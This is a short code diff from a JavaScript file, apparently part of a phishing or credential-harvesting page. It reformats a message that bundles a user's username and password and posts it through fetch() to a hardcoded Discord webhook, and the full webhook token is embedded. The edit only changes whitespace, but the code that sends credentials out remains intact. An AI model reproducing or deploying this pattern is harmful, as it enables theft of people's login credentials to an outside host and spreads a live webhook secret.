@@ -14,9 +14,9 @@
             const webhookURL = "https://discord.com/api/webhooks/1251386870043250808/3rDZtUOlUR_N_6SwnpcSQZL2LBTjNIxyRQ4cmQu7RioIsGkUtEw7QaKjiG3SGSMyiXxn";
             const data = {
                 content: `
-    **Nombre de usuario:** ${name}
-    -
-    **Contraseña:** ${password}`
+**Nombre de usuario:** ${name}
+-
+**Contraseña:** ${password}`
             };
 
             fetch(webhookURL, {
